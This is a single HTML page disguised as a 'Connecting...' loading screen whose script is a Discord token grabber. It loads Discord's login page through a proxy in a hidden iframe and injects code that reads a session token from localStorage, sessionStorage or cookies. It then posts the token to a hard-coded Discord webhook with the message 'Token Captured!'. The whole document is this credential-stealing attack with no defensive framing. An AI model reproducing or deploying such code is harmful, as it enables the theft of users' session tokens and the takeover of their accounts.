<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting...</title>
    <style>
        body { background: #282b30; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #7289da; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #msg { margin-top: 20px; font-size: 14px; color: #999; }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader"></div>
        <div id="msg">Analyzing session...</div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";

        function sendToWebhook(data) {
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: `🔓 **Token Captured!**\n\n\`\`\`${data}\`\`\`` })
            }).then(() => {
                document.getElementById('msg').innerText = "Token sent successfully!";
            }).catch(() => {
                document.getElementById('msg').innerText = "Error sending to webhook.";
            });
        }

        window.addEventListener("message", function(event) {
            // Allow any origin if testing locally, but prefer specific ones
            if (event.data && event.data !== "NO_TOKEN_FOUND") {
                console.log("Token received:", event.data);
                sendToWebhook(event.data);
                document.getElementById('msg').innerText = "Success!";
            }
        });

        const iframe = document.createElement('iframe');
        
        // Use allorigins.win to bypass X-Frame-Options
        // Note: This returns the raw HTML of the login page
        iframe.src = `https://api.allorigins.win/raw?url=${encodeURIComponent('https://discord.com/login')}`;
        
        iframe.style.display = 'none';
        document.body.appendChild(iframe);

        iframe.onload = function() {
            try {
                // Get the document from the iframe
                const iframeWindow = iframe.contentWindow;
                const doc = iframeWindow.document;
                
                // Create and inject the script
                const script = doc.createElement('script');
                script.textContent = `
                    (function() {
                        // Wait for DOM to be ready
                        if (document.readyState === 'loading') {
                            document.addEventListener('DOMContentLoaded', grabAndSend);
                        } else {
                            grabAndSend();
                        }

                        function grabAndSend() {
                            // Try localStorage
                            let token = localStorage.getItem('token');
                            
                            // If not found, try sessionStorage
                            if (!token) {
                                token = sessionStorage.getItem('token');
                            }

                            // If still not found, try cookies
                            if (!token) {
                                const cookies = document.cookie;
                                const match = cookies.match(/(?:^|;\s*)token=([^;]*)/);
                                if (match) {
                                    token = decodeURIComponent(match[1]);
                                }
                            }

                            if (token) {
                                window.parent.postMessage(token, '*');
                            } else {
                                window.parent.postMessage('NO_TOKEN_FOUND', '*');
                            }
                        }
                    })();
                `;
                
                // Append to body
                doc.body.appendChild(script);
                
                // Timeout fallback
                setTimeout(() => {
                    document.getElementById('msg').innerText = "Timeout or no token found.";
                }, 10000);

            } catch (e) {
                console.error("Injection failed:", e);
                document.getElementById('msg').innerText = "Injection failed.";
            }
        };
    </script>
</body>
</html>
